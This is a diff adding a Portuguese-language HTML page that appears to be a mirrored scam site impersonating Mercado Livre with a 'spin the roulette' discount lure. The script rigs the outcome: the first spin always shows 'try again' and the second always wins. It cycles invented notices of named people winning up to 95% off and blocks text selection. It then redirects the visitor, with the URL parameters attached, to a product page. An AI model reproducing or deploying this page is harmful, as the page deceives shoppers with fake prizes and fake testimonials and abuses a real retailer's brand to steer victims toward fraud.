@@ -1,0 +1,301 @@
+
+<html lang="pt-br">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script src="/roletaassets/latest.js" data-utmify-fast-start="" async="" defer=""></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Mercado Livre</title>
+    
+    
+    <script>
+      function disableselect(e) {
+          return false;
+      }
+      
+      function reEnable() {
+          return true;
+      }
+      
+      document.onselectstart = new Function("return false");
+      
+      if (window.sidebar) {
+          document.onmousedown = disableselect;
+          document.onclick = reEnable;
+      }
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="https://recebe-enquantotempml.online/roleta1/images/favicon.png">
+    <link rel="shortcut icon" href="https://recebe-enquantotempml.online/roleta1/images/favicon.png">
+    <title>Mercado Livre - Gire a Roleta!</title>
+    <link rel="stylesheet" href="/roletaassets/all.css" crossorigin="anonymous">
+    <link rel="stylesheet" href="/roletaassets/bootstrap.min.css">
+    <link rel="stylesheet" href="/roletaassets/stylead8e.css">
+    <script src="/roletaassets/jquery-3.0.0.slim.min.js"></script>
+    <script src="/roletaassets/jquery.min.js"></script>
+    <script src="/roletaassets/bootstrap.min.js"></script>
+    <script src="/roletaassets/confetti.browser.min.js"></script>
+  </head>
+  <body cz-shortcut-listen="true">
+    <div id="loading-screen" style="display: none;">
+      <div class="spinner-loading"></div>
+    </div>
+    <div id="page-content">
+      <section>
+        <div class="cta">
+          <h1>
+            Gire a <b>Roleta</b> para ganhar o seu <b>Mega Desconto</b>!
+          </h1>
+        </div>
+        <div class="roulette">
+          <img src="/roletaassets/responda.html" id="roleta1">
+          <div id="roleta2">
+            <img src="/roletaassets/roleta.png" class="spinner">
+          </div>
+          <img src="/roletaassets/button-gire.png" id="roleta3">
+        </div>
+        <div class="button-roulette">
+          <button id="button-cta" class="runSpin">        
+          GIRE PARA GANHAR
+          </button>
+        </div>
+      </section>
+    </div>
+    <div id="people" class="people slide-animation">
+      <img src="https://i.postimg.cc/25gVzM07/21.jpg" id="people-img" alt="">
+      <p style="text-align: center" id="people-p">Geraldo Nascimento acabou de ganhar <b>95% de desconto</b>!</p>
+    </div>
+    <div id="overlay" class="overlay"></div>
+    <div id="popup-try-again" class="popup">
+      <div class="popup-content">
+        <h2>Uma pena!</h2>
+        <img src="/roletaassets/sweat.png">
+        <p>Você não conseguiu desta vez, mas pode rodar novamente!</p>
+        <button id="try-again-button">Tentar Novamente</button>
+      </div>
+    </div>
+    <div id="popup" class="popup">
+      <div class="popup-content">
+        <h2>Parabéns!</h2>
+        <img src="/roletaassets/star-struck.png">
+        <p>Você ganhou um prêmio <b>incrível</b>!</p>
+        <button id="resgatar-premio" href="lojaeprodutos/rl-loja/index.html">Resgatar seu Prêmio</button>
+      </div>
+    </div>
+    <script>
+      let attempt = 0; // Variável para contar as tentativas
+      
+      const animateSpin = () => {
+          const roleta2 = document.querySelector('#roleta2');
+          const roleta2Img = document.querySelector('#roleta2 img');
+          const buttonCta = document.getElementById('button-cta');
+      
+          if (roleta2) {
+              // Removendo a classe 'spinner' existente
+              roleta2Img.classList.remove('spinner');
+              buttonCta.style.display = 'none'; // Esconder o botão ao girar
+      
+              // Verificando a tentativa
+              if (attempt === 0) {
+                  // Adicionando a nova classe de animação para simular a queda em "tente novamente"
+                  const animatedClass = 'wheel__spinner_animated_retry_then_win';
+                  roleta2.classList.add(animatedClass);
+      
+                  // Mostrar popup de "tente novamente" após a rotação
+                  setTimeout(() => {
+                      // Mostrar o overlay e o popup de tente novamente
+                      const overlay = document.getElementById('overlay');
+                      const tryAgainPopup = document.getElementById('popup-try-again');
+                      overlay.style.display = 'block';
+                      tryAgainPopup.style.display = 'block';
+                  }, 10000); // 10 segundos de rotação antes de mostrar o popup
+              } else {
+                  // Adicionando a nova classe de animação para simular a queda no prêmio
+                  const animatedClass = 'wheel__spinner_animated';
+                  roleta2.classList.add(animatedClass);
+      
+                  // Mostrar popup de resgatar prêmio após a rotação
+                  setTimeout(() => {
+                      // Executar a animação de confetes
+                      confetti({
+                        particleCount: 100,
+                        spread: 70,
+                        origin: { y: 0.6 }
+                      });
+      
+                      // Mostrar o overlay e o popup
+                      const overlay = document.getElementById('overlay');
+                      const popup = document.getElementById('popup');
+                      overlay.style.display = 'block';
+                      popup.style.display = 'block';
+      
+                      buttonCta.classList.add('hide-me');
+                  }, 10000);
+              }
+          }
+      };
+      
+      const addSpinAnimation = (element) => {
+          element.addEventListener('click', () => {
+              animateSpin();
+              attempt++; // Incrementar a tentativa após o clique
+          });
+      };
+      
+      // Add event listener to all elements with the class .runSpin
+      document.querySelectorAll('.runSpin').forEach(addSpinAnimation);
+      
+      document.getElementById('try-again-button').addEventListener('click', () => {
+          // Ocultar o popup e o overlay
+          const overlay = document.getElementById('overlay');
+          const tryAgainPopup = document.getElementById('popup-try-again');
+          overlay.style.display = 'none';
+          tryAgainPopup.style.display = 'none';
+      
+          // Reiniciar a animação da roleta
+          const roleta2 = document.querySelector('#roleta2');
+          roleta2.classList.remove('wheel__spinner_animated_retry_then_win');
+      
+          // Mostrar o botão "GIRE PARA GANHAR" novamente
+          const buttonCta = document.getElementById('button-cta');
+          buttonCta.style.display = 'block';
+      });
+      
+      (() => {
+          const descontos = [5, 25, 50, 75, 95];
+      
+          const frases = [
+              {
+                  frase: `Pedro Oliveira acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/RhB8zCK5/24.jpg',
+              },
+              {
+                  frase: `Ana Alves acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/prw31XTF/2.jpg',
+              },
+              {
+                  frase: `Fernanda Santos acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/X7FvNr9t/3.jpg',
+              },
+              {
+                  frase: `Bruno Souza acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/2ynfYBgw/5.jpg',
+              },
+              {
+                  frase: `Fabrício Costa acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/kXrTRHtD/6.jpg',
+              },
+              {
+                  frase: `Juliana Lima acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/0ynPrDjX/4.jpg',
+              },
+              {
+                  frase: `Yasmin Araújo acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/9XNrx3BF/10.jpg',
+              },
+              {
+                  frase: `Lucilene Silva acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/x8Wj92sv/11.jpg',
+              },
+              {
+                  frase: `Everaldo Rocha acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/nhFYvfVV/7.jpg',
+              },
+              {
+                  frase: `Oswaldo Carvalho acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/cHSQ4pzN/9.jpg',
+              },
+              {
+                  frase: `João Pereira acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/W3wf26XX/14.jpg',
+              },
+              {
+                  frase: `Ariadiny Gomes acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/xTMNqxKf/12.jpg',
+              },
+              {
+                  frase: `Carla Ferreira acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/qq8BBFWW/13.jpg',
+              },
+              {
+                  frase: `Gabriela Vieira acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/MT9bPss2/15.jpg',
+              },
+              {
+                  frase: `Wellington Martins acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/vmBW17Y0/16.jpg',
+              },
+              {
+                  frase: `Iago Barbosa acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/rwgHX9Zj/17.jpg',
+              },
+              {
+                  frase: `Maicon Ramos acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/0NFcPXYY/18.jpg',
+              },
+              {
+                  frase: `Vitória Castro acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/VkSKpcMf/19.jpg',
+              },
+              {
+                  frase: `Matheus Santos acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/qvXNkN2j/20.jpg',
+              },
+              {
+                  frase: `Marta Rocha acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/N0Fdh9nr/23.jpg',
+              },
+              {
+                  frase: `Geraldo Nascimento acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/25gVzM07/21.jpg',
+              },
+              {
+                  frase: `Daniel Ribeiro acabou de ganhar <b>${descontos[Math.floor(Math.random() * descontos.length)]}% de desconto</b>!`,
+                  imgSrc: 'https://i.postimg.cc/ZK0tcnb0/22.jpg',
+              },
+          ];
+      
+          window.addEventListener('DOMContentLoaded', () => {
+              const contDiv = document.getElementById('people');
+              const peopleFrase = document.getElementById('people-p');
+              const peopleImg = document.querySelector('#people-img');
+              setInterval(() => {
+                  const rand = Math.floor(Math.random() * frases.length);
+                  const { frase } = frases[rand];
+                  const { imgSrc } = frases[rand];
+                  peopleFrase.innerHTML = frase;
+                  peopleImg.src = imgSrc;
+                  contDiv.classList.toggle('display-off');
+                  contDiv.classList.remove('slide-animation');
+                  setTimeout(() => {
+                      contDiv.classList.toggle('display-off');
+                      contDiv.classList.add('slide-animation');
+                  }, 20);
+              }, 4000); // 5 segundos antes de trocar para a próxima mensagem
+          });
+      })();
+      
+      // Função para obter todos os parâmetros da URL
+      const getQueryParams = () => {
+          const params = new URLSearchParams(window.location.search);
+          return params.toString();
+      };
+      
+      // Event listener for the resgatar button
+      document.getElementById('resgatar-premio').addEventListener('click', () => {
+          // Logic to redeem the prize
+          const queryParams = getQueryParams();
+          const baseUrl = '/produtos';
+          const redirectUrl = queryParams ? `${baseUrl}?${queryParams}` : baseUrl;
+          window.location.href = redirectUrl;
+      });
+      
+      window.addEventListener('load', function() {
+          const loadingScreen = document.getElementById('loading-screen');
+          loadingScreen.style.display = 'none';
+      });
+    </script>
+    <script src="/roletaassets/jstools.js"></script>
+  </body>
+  <!-- Mirrored from promocaorespondaeganhe.shop/roleta by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 14 Jul 2024 17:39:50 GMT -->
+</html>
